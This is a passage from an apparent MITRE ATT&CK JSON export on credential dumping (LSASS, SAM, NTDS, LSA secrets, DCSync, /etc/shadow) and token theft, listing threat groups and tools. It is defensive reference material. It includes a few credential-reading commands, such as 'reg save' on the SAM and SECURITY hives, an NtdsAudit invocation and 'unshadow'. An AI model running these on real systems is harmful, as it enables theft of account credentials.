{"id": "G0033", "name": "Poseidon Group", "description": "Poseidon Group conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT has a plugin for credential harvesting."}, {"id": "G0054", "name": "Sowbug", "description": "Sowbug has used credential dumping tools."}, {"id": "G0039", "name": "Suckfly", "description": "Suckfly used a signed credential-dumping tool to obtain victim account credentials."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has used a variety of credential dumping tools."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can dump passwords and save them into \\ProgramData\\Mail\\MailAg\\pwds.txt."}], "sub_techniques": [{"name": "LSASS Memory", "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.", "detailed_description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\nFor example, on the target host use procdump:\nLocally, mimikatz can be run using:\nBuilt-in Windows tools such as comsvcs.dll can also be used:\nSimilar to Image File Execution Options Injection, the silent process exit mechanism can be abused to create a memory dump of lsass.exe through Windows Error Reporting (WerFault.exe).\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\nThe following SSPs can be used to access credentials:", "id": "T1003.001", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used Mimikatz to capture and use legitimate credentials."}, {"id": "G1030", "name": "Agrius", "description": "Agrius used tools such as Mimikatz to dump LSASS memory to capture credentials in victim environments."}, {"id": "G0006", "name": "APT1", "description": "APT1 has been known to use credential dumping using Mimikatz."}, {"id": "G0007", "name": "APT28", "description": "APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims. They have also dumped the LSASS process memory using the MiniDump function."}, {"id": "G0022", "name": "APT3", "description": "APT3 has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument \"dig.\""}, {"id": "G0050", "name": "APT32", "description": "APT32 used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used a variety of publicly available tools like LaZagne, Mimikatz, and ProcDump to dump credentials."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used Mimikatz, Windows Credential Editor and ProcDump to dump credentials."}, {"id": "G0096", "name": "APT41", "description": "APT41 has used hashdump, Mimikatz, Procdump, and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used the Task Manager process to target LSASS process memory in order to obtain NTLM password hashes. APT5 has also dumped clear text passwords and hashes from memory using Mimikatz hosted through an RDP mapped drive."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has attempted to harvest credentials through LSASS memory dumping."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit has used Mimikatz to harvest credentials from the victim's machine."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used Mimikatz to retrieve credentials from LSASS memory."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used various tools (such as Mimikatz and WCE) to perform credential dumping."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used Mimikatz and a custom tool, SecHack, to harvest credentials."}, {"id": "G0003", "name": "Cleaver", "description": "Cleaver has been known to dump credentials using Mimikatz and Windows Credential Editor."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can spawn a job to inject into LSASS memory and dump password hashes."}, {"id": "S0046", "name": "CozyCar", "description": "CozyCar has executed Mimikatz to harvest stored credentials from the victim and further victim penetration."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used Task Manager to dump LSASS memory from Windows devices to disk."}, {"id": "S0187", "name": "Daserf", "description": "Daserf leverages Mimikatz and Windows Credential Editor to steal credentials."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used ProcDump to obtain the hashes of credentials by dumping the memory of the LSASS process."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear uses legitimate Sysinternals tools such as procdump to dump LSASS memory."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed dropping and executing password grabber modules including Mimikatz."}, {"id": "S0363", "name": "Empire", "description": "Empire contains an implementation of Mimikatz to gather credentials from memory."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has obtained memory dumps with ProcDump to parse and extract credentials from a victim's LSASS process memory with Mimikatz."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used Windows Credential Editor for credential dumping."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE)."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used prodump to dump credentials from LSASS."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used a modified version of Mimikatz along with a PowerShell-based Mimikatz to dump credentials on the victim machines."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy has a module for Mimikatz to collect Windows credentials from the victim\u2019s machine."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used procdump to dump the LSASS process memory."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors dumped LSASS memory on compromised hosts."}, {"id": "S0357", "name": "Impacket", "description": "SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider used Cobalt Strike to carry out credential dumping using ProcDump."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has dumped credentials, including by using Mimikatz."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has gathered credentials using Mimikatz and ProcDump."}, {"id": "S0349", "name": "LaZagne", "description": "LaZagne can perform credential dumping from memory to obtain account and password information."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer used several tools for retrieving login and password information, including LaZagne and Mimikatz."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used publicly available tools to dump password hashes, including ProcDump and WCE."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can run Mimikatz to harvest credentials."}, {"id": "S0121", "name": "Lslsass", "description": "Lslsass can dump active logon session password hashes from the lsass process."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can dump password hashes from LSASS.exe."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has stolen domain credentials by dumping LSASS process memory using Task Manager, comsvcs.dll, and from a Microsoft Active Directory Domain Controller using Mimikatz."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSASS Memory."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet retrieved credentials from LSASS memory."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has performed credential dumping with Mimikatz and procdump64.exe."}, {"id": "S0056", "name": "Net Crawler", "description": "Net Crawler uses credential dumpers such as Mimikatz and Windows Credential Editor to extract cached credentials from Windows systems."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya contains a modified version of Mimikatz to help gather credentials that are later used for lateral movement."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used credential dumping tools such as Mimikatz to steal credentials to accounts logged into the compromised system and to Outlook Web Access."}, {"id": "S0439", "name": "Okrum", "description": "Okrum was seen using MimikatzLite to perform credential dumping."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer contains a module that tries to obtain credentials from LSASS, similar to Mimikatz. These credentials are used with PsExec and Windows Management Instrumentation to help the malware propagate itself across a network."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used ProcDump to dump credentials from memory."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has used keyloggers that are also capable of dumping credentials."}, {"id": "G1040", "name": "Play", "description": "Play has used Mimikatz and the Windows Task Manager to dump LSASS process memory."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT used voStro.exe, a compiled pypykatz (Python version of Mimikatz), to steal credentials."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains an implementation of Mimikatz to gather credentials from memory."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Exfiltration modules that can harvest credentials using Mimikatz."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can execute Lazagne as well as Mimikatz using PowerShell."}, {"id": "S0583", "name": "Pysa", "description": "Pysa can perform OS credential dumping using Mimikatz."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl used LaZagne to obtain passwords from memory."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used its plainpwd tool, a modified version of Mimikatz, and comsvcs.dll to dump Windows credentials from system memory."}, {"id": "G0091", "name": "Silence", "description": "Silence has used the Farse6.1 utility (based on Mimikatz) to extract credentials from lsass.exe."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can create a memory dump of LSASS via the MiniDumpWriteDump Win32 API call."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors have used a modified version of Mimikatz called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers."}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles used Mimikatz."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has attempted to access hashed credentials from the LSASS process memory space."}, {"id": "G0107", "name": "Whitefly", "description": "Whitefly has used Mimikatz to obtain credentials."}, {"id": "S0005", "name": "Windows Credential Editor", "description": "Windows Credential Editor can dump credentials."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has dumped the lsass.exe memory to harvest credentials with the use of open-source tool LaZagne."}]}, {"name": "Security Account Manager", "description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the net user command. Enumerating the SAM database requires SYSTEM level access.", "detailed_description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the net user command. Enumerating the SAM database requires SYSTEM level access.\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\nAlternatively, the SAM can be extracted from the Registry with Reg:\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\nNotes:", "id": "T1003.002", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius dumped the SAM file on victim machines to capture credentials."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used the reg save command to save registry hives."}, {"id": "G0096", "name": "APT41", "description": "APT41 extracted user account data from the Security Account Managerr (SAM), making a copy of this database from the registry using the reg save command or by exploiting volume shadow copies."}, {"id": "G1023", "name": "APT5", "description": "APT5 has copied and exfiltrated the SAM Registry hive from targeted systems."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 copied the SAM and SYSTEM Registry hives for credential harvesting."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can recover hashed passwords."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke collects Windows account hashes."}, {"id": "S0046", "name": "CozyCar", "description": "Password stealer and NTLM stealer modules in CozyCar harvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can dump usernames and hashed passwords from the SAM."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly used Reg to dump the Security Account Manager (SAM) hive from victim machines for follow-on credential extraction."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has dropped and executed SecretsDump to dump password hashes."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear acquires victim credentials by extracting registry hives such as the Security Account Manager through commands such as reg save."}, {"id": "S0120", "name": "Fgdump", "description": "Fgdump can dump Windows password hashes."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has extracted the SAM and SYSTEM registry hives using the reg.exe binary for obtaining password hashes from a compromised machine."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used reg commands to dump specific hives from the Windows Registry, such as the SAM hive, and obtain password hashes."}, {"id": "S0008", "name": "gsecdump", "description": "gsecdump can dump Windows password hashes from the SAM."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has the capability to harvest credentials and passwords from the SAM database."}, {"id": "S1022", "name": "IceApple", "description": "IceApple's Credential Dumper module can dump encrypted password hashes from SAM registry keys, including HKLM\\SAM\\SAM\\Domains\\Account\\F and HKLM\\SAM\\SAM\\Domains\\Account\\Users\\*\\V."}, {"id": "S0357", "name": "Impacket", "description": "SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has dumped credentials, including by using gsecdump."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can gather hashed passwords by dumping SAM/SECURITY hive."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the SAM table."}, {"id": "S0080", "name": "Mivast", "description": "Mivast has the capability to gather NTLM password information."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors dumped account hashes using gsecdump."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors leveraged a custom tool to dump OS credentials and used following commands: reg save HKLM\\\\SYSTEM system.hiv, reg save HKLM\\\\SAM sam.hiv, and reg save HKLM\\\\SECURITY security.hiv, to dump SAM, SYSTEM and SECURITY hives."}, {"id": "S0371", "name": "POWERTON", "description": "POWERTON has the ability to dump password hashes."}, {"id": "S0006", "name": "pwdump", "description": "pwdump can be used to dump credentials from the SAM."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can dump the SAM database."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has acquired credentials from the SAM/SECURITY registry hives."}]}, {"name": "NTDS", "description": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller.", "detailed_description": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller.\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.", "id": "T1003.003", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used the ntdsutil.exe utility to export the Active Directory database for credential access."}, {"id": "G0096", "name": "APT41", "description": "APT41 used ntdsutil to obtain a copy of the victim environment ntds.dit file."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has gathered the SYSTEM registry and ntds.dit files from target systems. Chimera specifically has used the NtdsAudit tool to dump the password hashes of domain users via msadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv and used ntdsutil to copy the Active Directory database."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can dump hashed passwords associated with Active Directory using Windows' Directory Replication Services API (DRSUAPI), or Volume Shadow Copy."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors accessed and mounted virtual hard disk backups to extract ntds.dit."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers."}, {"id": "S0404", "name": "esentutl", "description": "esentutl can copy ntds.dit using the Volume Shadow Copy service."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has harvested the NTDS.DIT file and leveraged the Impacket tool on the compromised domain controller to locally decrypt it."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used Metasploit\u2019s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used Volume Shadow Copy to access credential information from NTDS."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has stolen copies of the Active Directory database (NTDS.DIT)."}, {"id": "S0357", "name": "Impacket", "description": "SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information from NTDS.dit."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used NTDSDump and other password dumping tools to gather credentials."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can gather hashed passwords by gathering domain controller hashes from NTDS."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used Windows built-in tool ntdsutil to extract the Active Directory (AD) database."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used Ntdsutil to dump credentials."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file. Mustang Panda has also used reg save on the SYSTEM file Registry location to help extract the NTDS.dit file."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used ntdsutil.exe to back up the Active Directory database, likely for credential access."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has extracted the NTDS.dit file by creating volume shadow copies of virtual domain controller disks."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used ntds.util to create domain controller installation media containing usernames and password hashes."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database. Wizard Spider has also created a volume shadow copy and used a batch script file to collect NTDS.dit with the use of the Windows utility, ntdsutil."}]}, {"name": "LSA Secrets", "description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets. LSA secrets can also be dumped from memory.", "detailed_description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets. LSA secrets can also be dumped from memory.\nReg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.", "id": "T1003.004", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can dump secrets from the Local Security Authority."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used the reg save command to extract LSA secrets offline."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used a variety of publicly available tools like LaZagne to gather credentials."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke collects LSA secrets."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can dump hashed passwords from LSA secrets for the targeted system."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has dropped and executed SecretsDump to dump password hashes."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used frameworks such as Impacket to dump LSA secrets for credential capture."}, {"id": "S0008", "name": "gsecdump", "description": "gsecdump can dump LSA secrets."}, {"id": "S1022", "name": "IceApple", "description": "IceApple's Credential Dumper module can dump LSA secrets from registry keys, including: HKLM\\SECURITY\\Policy\\PolEKList\\default, HKLM\\SECURITY\\Policy\\Secrets\\*\\CurrVal, and HKLM\\SECURITY\\Policy\\Secrets\\*\\OldVal."}, {"id": "S0357", "name": "Impacket", "description": "SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has dumped credentials, including by using gsecdump."}, {"id": "S0349", "name": "LaZagne", "description": "LaZagne can perform credential dumping from LSA secrets to obtain account and password information."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer used several tools for retrieving login and password information, including LaZagne."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has performed credential dumping with LaZagne."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can use Lazagne for harvesting credentials."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers."}]}, {"name": "Cached Domain Credentials", "description": "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.", "detailed_description": "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password.\nOn Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at /var/lib/sss/db/cache.[domain].ldb for SSSD or /var/opt/quest/vas/authcache/vas_auth.vdb for Quest. Adversaries can use utilities, such as tdbdump, on these database files to dump the cached hashes and use Password Cracking to obtain the plaintext password.\nWith SYSTEM or sudo access, the tools/utilities such as Mimikatz, Reg, and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.\nNote: Cached credentials for Windows Vista are derived using PBKDF2.", "id": "T1003.005", "examples": [{"id": "G0064", "name": "APT33", "description": "APT33 has used a variety of publicly available tools like LaZagne to gather credentials."}, {"id": "S0119", "name": "Cachedump", "description": "Cachedump can extract cached password hashes from cache entry information."}, {"id": "S0349", "name": "LaZagne", "description": "LaZagne can perform credential dumping from MSCache to obtain account and password information."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer used several tools for retrieving login and password information, including LaZagne."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has performed credential dumping with LaZagne."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access."}, {"id": "S0439", "name": "Okrum", "description": "Okrum was seen using modified Quarks PwDump to perform credential dumping."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can use Lazagne for harvesting credentials."}]}, {"name": "DCSync", "description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)    to simulate the replication process from a remote domain controller using a technique called DCSync.", "detailed_description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)    to simulate the replication process from a remote domain controller using a technique called DCSync.\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticket or change an account's password as noted in Account Manipulation.\nDCSync functionality has been included in the \"lsadump\" module in Mimikatz. Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.", "id": "T1003.006", "examples": [{"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider performed domain replication."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used a DCSync command with Mimikatz to retrieve credentials from an exploited controller."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used DCSync attacks to gather credentials for privilege escalation routines."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DCSync/NetSync."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used Mimikatz's DCSync to dump credentials from the memory of the targeted system."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used privileged accounts to replicate directory service data with domain controllers."}]}, {"name": "Proc Filesystem", "description": "Adversaries may gather credentials from the proc filesystem or /proc. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the /proc/<PID>/maps file shows how memory is mapped within the process\u2019s virtual address space. And /proc/<PID>/mem, exposed for debugging purposes, provides access to the process\u2019s virtual address space.", "detailed_description": "Adversaries may gather credentials from the proc filesystem or /proc. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the /proc/<PID>/maps file shows how memory is mapped within the process\u2019s virtual address space. And /proc/<PID>/mem, exposed for debugging purposes, provides access to the process\u2019s virtual address space.\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1, to look for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process\u2019s memory.\nIf running as or with the permissions of a web browser, a process can search the /maps & /mem locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.", "id": "T1003.007", "examples": [{"id": "S0349", "name": "LaZagne", "description": "LaZagne can use the <PID>/maps and <PID>/mem files to identify regex patterns to dump cleartext passwords from the browser's process memory."}, {"id": "S0179", "name": "MimiPenguin", "description": "MimiPenguin can use the <PID>/maps and <PID>/mem file to search for regex patterns and dump the process memory."}, {"id": "S1109", "name": "PACEMAKER", "description": "PACEMAKER has the ability to extract credentials from OS memory."}]}, {"name": "/etc/passwd and /etc/shadow", "description": "Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking. Most modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information including password hashes in /etc/shadow. By default, /etc/shadow is only readable by the root user.", "detailed_description": "Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking. Most modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information including password hashes in /etc/shadow. By default, /etc/shadow is only readable by the root user.\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: # /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db", "id": "T1003.008", "examples": [{"id": "S0349", "name": "LaZagne", "description": "LaZagne can obtain credential information from /etc/shadow using the shadow.py module."}]}]}, {"name": "Steal Application Access Token", "description": "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.", "detailed_description": "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.\nFor example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container\u2019s token and thereby gain access to Kubernetes API commands.  Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment. If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges.\nToken theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow. An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.\nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls. Then, they can send a Spearphishing Link to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through Application Access Token.\nApplication access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens, allowing them to obtain new access tokens without prompting the user.", "id": "T1528", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can steal users\u2019 access tokens via phishing emails containing malicious links."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used several malicious applications to steal user OAuth access tokens including applications masquerading as \"Google Defender\" \"Google Email Protection,\" and \"Google Scanner\" for Gmail users. They also targeted Yahoo users with applications masquerading as \"Delivery Service\" and \"McAfee Email Protection\"."}, 